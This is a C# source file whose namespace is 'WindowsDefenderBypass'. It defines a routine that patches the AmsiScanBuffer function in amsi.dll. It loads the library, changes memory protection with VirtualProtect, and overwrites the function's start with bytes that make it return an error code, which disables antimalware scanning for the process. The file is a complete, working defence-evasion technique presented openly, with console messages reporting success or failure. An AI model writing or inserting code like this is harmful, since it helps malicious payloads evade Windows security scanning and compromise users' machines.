using System;
using System.Runtime.InteropServices;

namespace WindowsDefenderBypass
{
    public static class AMSIBypass
    {
        public static void AttemptBypass()
        {
            try
            {
                IntPtr hAmsi = NativeMethods.LoadLibrary("amsi.dll");
                if (hAmsi == IntPtr.Zero)
                {
                    Console.WriteLine("  [!] Could not load amsi.dll");
                    return;
                }

                IntPtr asbAddr = NativeMethods.GetProcAddress(hAmsi, "AmsiScanBuffer");
                if (asbAddr == IntPtr.Zero)
                {
                    Console.WriteLine("  [!] Could not find AmsiScanBuffer");
                    return;
                }

                byte[] patch = { 0x31, 0xC0, 0x05, 0x57, 0x00, 0x07, 0x80, 0xC3 };

                uint oldProtect;
                if (NativeMethods.VirtualProtect(asbAddr, (UIntPtr)patch.Length, NativeMethods.PAGE_EXECUTE_READWRITE, out oldProtect))
                {
                    Marshal.Copy(patch, 0, asbAddr, patch.Length);
                    NativeMethods.VirtualProtect(asbAddr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                    Console.WriteLine("  [+] AMSI bypass applied successfully");
                }
                else
                {
                    Console.WriteLine("  [!] Could not modify memory protection");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"  [!] AMSI bypass failed: {ex.Message}");
            }
        }
    }
}
